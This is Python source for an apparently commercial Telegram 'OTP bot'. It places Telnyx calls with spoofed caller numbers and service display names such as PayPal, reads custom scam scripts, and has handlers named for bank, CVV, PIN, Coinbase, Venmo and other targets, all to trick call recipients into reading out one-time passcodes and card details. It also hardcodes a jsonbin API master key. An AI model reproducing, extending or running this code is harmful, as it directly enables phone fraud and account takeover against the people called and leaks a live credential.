def first_input_by_user(update: Update, context: CallbackContext):
    first = update.message.text
    context.user_data['first'] = first
    context.bot.send_message(chat_id=update.effective_chat.id,
                                 text='Please enter the second part of the script \nVARIABLES: {name} {module} {otpdigits}', parse_mode=ParseMode.HTML)
    return SECOND_INP

def second_input_by_user(update: Update, context: CallbackContext):
    second = update.message.text
    context.user_data['second'] = second
    context.bot.send_message(chat_id=update.effective_chat.id,
                                 text='Please enter the third part of the script \nVARIABLES: {name} {module} {otpdigits}',parse_mode=ParseMode.HTML)
    return THIRD_INP

def third_input_by_user(update: Update, context: CallbackContext):
    ''' The user's reply to the name prompt comes here  '''
    third = update.message.text

    context.user_data['third'] = third
    part1 = context.user_data['first']
    part2 = context.user_data['second']
    part3 = context.user_data['third']
    res = check_key(update.effective_user.id)
    if(res == "EXPIRED" or res == "INVALID"): 
        update.message.reply_text("🔒 Please contact Bot Admin to purchase subscription!",parse_mode=ParseMode.HTML)
        return
            

        
        
    try:
        url = "https://api.jsonbin.io/v3/b"
        headers = {
              'Content-Type': 'application/json',
              'X-Master-Key': '$2b$10$yMBgc3lQAJfWiWRZve1SmeSqGc2o/4CiNWBct5ozpOfBN6V4xrNtO.'
        }
        data = {"part1": part1, "part2": part2, "part3": part3}
        req = requests.post(url, json=data, headers=headers)
        respp = json.loads(str(req.text))
        update.message.reply_text("🔒 Custom Script ID: "+respp["metadata"]["id"],parse_mode=ParseMode.HTML)

        return ConversationHandler.END
    except:
        res = check_key(update.effective_user.id)



def hangup(update: Update, context: CallbackContext):
    update.message.reply_text(
        'Call hanged Up')
    return call.hangup


def cancel(update: Update, context: CallbackContext):
    update.message.reply_text(
        'Custom cancelled by user. Send /custom to start again')
    return ConversationHandler.END

def script(update: Update, context: CallbackContext):
    
    msg = str(update.message.text).split()
    res = check_key(update.effective_user.id)
    try:
        if (int(res[1]) > 0):
            try:
                sid = msg[1]
                url = f"https://api.jsonbin.io/v3/b/{sid}/latest"
                headers = {
                      'X-Master-Key': '$2b$10$yMBgc3lQAJfWiWRZve1SmeSqGc2o/4CiNWBct5ozpOfBN6V4xrNtO.'
                }
                req = requests.get(url, json=None, headers=headers)
                partsj = json.loads(str(req.text))
                part1 = partsj["record"]["part1"]
                part2 = partsj["record"]["part2"]
                part3 = partsj["record"]["part3"]
                update.message.reply_text(f"Part 1️⃣: {part1}\n\nPart 2️⃣: {part2}\n\nPart 3️⃣: {part3}")

            except Exception as ex:

                update.message.reply_text("▪ Error Has Occured!" + '\n' + '\n' + "🡢 Your command is incorrect / Bot Is Down" + '\n' + "🡢 /script scriptid")
    except:
        res = check_key(update.effective_user.id)
        if(res == "EXPIRED"): 
            update.message.reply_text("🔒 Please contact Bot Admin to purchase subscription!",parse_mode=ParseMode.HTML)     
        else:
            update.message.reply_text("🔒 Please contact Bot Admin to purchase subscription!",parse_mode=ParseMode.HTML)    



def purchase(update: Update, context: CallbackContext):
    update.message.reply_text("🛒 Buy bot here - @RealStonedApe",parse_mode=ParseMode.HTML)

           
def customcall(update: Update, context: CallbackContext):
    msg = str(update.message.text).split()
    substring = "-"
    if substring in str(update.message.chat_id):
        update.message.reply_text("🔒 You can't use the bot in a channel.",parse_mode=ParseMode.HTML)
        return

    if checkdate(update.effective_chat.id):
        try:
            tguser = update.message.chat.username
            number = msg[1]
            spoof = msg[2]
            service = msg[3]
            name = msg[4]
            otpdigits = msg[5]
            sid = msg[6]
            tag = update.message.chat.username
            chatid = update.message.from_user['id']
            call = telnyx.Call.create(connection_id=telnyx_connection_id, to=f"+{number}", from_=f"+{spoof}", from_display_name=f"{service}", record="record-from-answer", webhook_url=f"{url}/custom/{number}/{spoof}/{service}/{name}/{otpdigits}/{sid}/{chatid}/{tag}", answering_machine_detection= "premium")
            context.user_data['call'] = call
            keyboard = [[InlineKeyboardButton("End Call", callback_data='end_call')]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            update.message.reply_text(f"""📞 Calling {number} from {spoof}""", reply_markup=reply_markup)
        except:
        
            update.message.reply_text("❌ Oops... Something went wrong." + '\n' + '\n' + "☎️ /customcall 15087144578 18888888888 Paypal John 6 63067b53a1610e63860d8a0a " + '\n' + "📲 /customcall number spoofnumber service name otpdigits scriptid")

    else:
        update.message.reply_text("🛒 Buy bot here - @RealStonedApe",parse_mode=ParseMode.HTML)
def customvoice(update: Update, context: CallbackContext):
    msg = str(update.message.text).split()
    substring = "-"
    if substring in str(update.message.chat_id):
        update.message.reply_text("🔒 You can't use the bot in a channel.",parse_mode=ParseMode.HTML)
        return
    options = ["arb","cmn-CN","cy-GB","da-DK","de-DE","en-AU","en-GB","en-GB-WLS","en-IN","en-US","es-ES","es-MX","es-US","fr-CA","fr-FR","hi-IN","is-IS","it-IT","ja-JP","ko-KR","nb-NO","nl-NL","pl-PL","pt-BR","pt-PT","ro-RO","ru-RU","sv-SE","tr-TR"]
    if checkdate(update.effective_chat.id):
        try:
            tguser = update.message.chat.username
            number = msg[1]
            spoof = msg[2]
            service = msg[3]
            name = msg[4]
            otpdigits = msg[5]
            sid = msg[6]
            lang = msg[7]
            tag = update.message.chat.username
            chatid = update.message.from_user['id']
            if not lang in options:
                update.message.reply_text(f"🔒 Incorrect Language! Available languages: \n\n {options}",parse_mode=ParseMode.HTML)
                return
            else:
                call = telnyx.Call.create(connection_id=telnyx_connection_id, to=f"+{number}", from_=f"+{spoof}", from_display_name=f"{service}", record="record-from-answer",    webhook_url=f"{url}/customv/{number}/{spoof}/{service}/{name}/{otpdigits}/{sid}/{lang}/{chatid}/{tag}", answering_machine_detection= "premium")
                context.user_data['call'] = call
                keyboard = [[InlineKeyboardButton("End Call", callback_data='end_call')]]
                reply_markup = InlineKeyboardMarkup(keyboard)
                update.message.reply_text(f"""📞 Calling {number} from {spoof}""", reply_markup=reply_markup)
        except:
        
            update.message.reply_text("❌ Oops... Something went wrong." + '\n' + '\n' + "☎️ /customvoice 15087144578 18888888888 Paypal John 6 63067b53a1610e63860d8a0a en-US" + '\n' + "📲 /customvoice number spoofnumber service name otpdigits scriptid language")
    else:
            update.message.reply_text("🛒 Buy bot here - @RealStonedApe",parse_mode=ParseMode.HTML)

def main():
    updater = Updater(token=token, use_context=True)
    dispatcher = updater.dispatcher
    custom_voice = CommandHandler('customvoice', customvoice)
    start_handler = CommandHandler('start', start)
    genkey_handler = CommandHandler("genkey", genkey)
    redeem_handler = CommandHandler("redeem", redeem)
    plan_handler = CommandHandler("plan", plan)
    help_handler = CommandHandler('help', help)
    call_handler = CommandHandler('call', call)
    recall_handler = CommandHandler('recall', recall)
    remind_handler = CommandHandler('remind', remind)
    bank_handler = CommandHandler('bank', bank)
    cvv_handler = CommandHandler('cvv', cvv)
    email_handler = CommandHandler('email', email)
    balance_handler = CommandHandler('balance', balance)
    amazon_handler = CommandHandler('amazon', amazon)
    applepay_handler = CommandHandler('applepay', applepay)
    coinbase_handler = CommandHandler('coinbase', coinbase)
    microsoft_handler = CommandHandler('microsoft', microsoft)
    venmo_handler = CommandHandler('venmo', venmo)
    cashapp_handler = CommandHandler('cashapp', cashapp)
    quadpay_handler = CommandHandler('quadpay', quadpay)
    paypal_handler = CommandHandler('paypal', paypal)
    carrier_handler = CommandHandler('carrier', carrier)
    pin_handler = CommandHandler('pin', pin)
    custom_create = CommandHandler('customtest', createcustom)
    crypto_create = CommandHandler('crypto', crypto)
    custom_call = CommandHandler('customcall', customcall)
    purchase_com = CommandHandler('purchase', purchase)
    
    # accept_handler = CommandHandler('accept', accept)
    # deny_handler = CommandHandler('deny', deny)

    conv_handler = ConversationHandler(
        entry_points=[CommandHandler('createscript', set_input_handler)],
        states={
            FIRST_INP: [MessageHandler(Filters.text, first_input_by_user)],
            SECOND_INP: [MessageHandler(Filters.text, second_input_by_user)],
            THIRD_INP: [MessageHandler(Filters.text, third_input_by_user)],
        },
        fallbacks=[CommandHandler('cancel', cancel)]
    )
    dispatcher.add_handler(custom_voice)
    dispatcher.add_handler(balance_handler)
    dispatcher.add_handler(genkey_handler)
    dispatcher.add_handler(redeem_handler)
    dispatcher.add_handler(coinbase_handler)
    dispatcher.add_handler(quadpay_handler)
    dispatcher.add_handler(venmo_handler)
    dispatcher.add_handler(carrier_handler)
    dispatcher.add_handler(paypal_handler)
    dispatcher.add_handler(cashapp_handler)
    dispatcher.add_handler(applepay_handler)
    dispatcher.add_handler(microsoft_handler)
    dispatcher.add_handler(plan_handler)
    dispatcher.add_handler(custom_call)
    dispatcher.add_handler(conv_handler)
    dispatcher.add_handler(crypto_create)
    dispatcher.add_handler(custom_create)
    dispatcher.add_handler(pin_handler)
    dispatcher.add_handler(start_handler)
    dispatcher.add_handler(call_handler)
    dispatcher.add_handler(recall_handler)
    dispatcher.add_handler(bank_handler)
    dispatcher.add_handler(cvv_handler)
    dispatcher.add_handler(help_handler)
    dispatcher.add_handler(remind_handler)
    dispatcher.add_handler(email_handler)
    dispatcher.add_handler(amazon_handler)
    dispatcher.add_handler(purchase_com)
    # dispatcher.add_handler(accept_handler)
    # dispatcher.add_handler(deny_handler)
    dispatcher.add_handler(CallbackQueryHandler(button, pattern='^(accept|deny)$'))
    dispatcher.add_handler(CallbackQueryHandler(end_call, pattern='^end_call$'))
    updater.start_polling()
    print("Bot is Online")
    
    
if __name__ == '__main__':
    main()
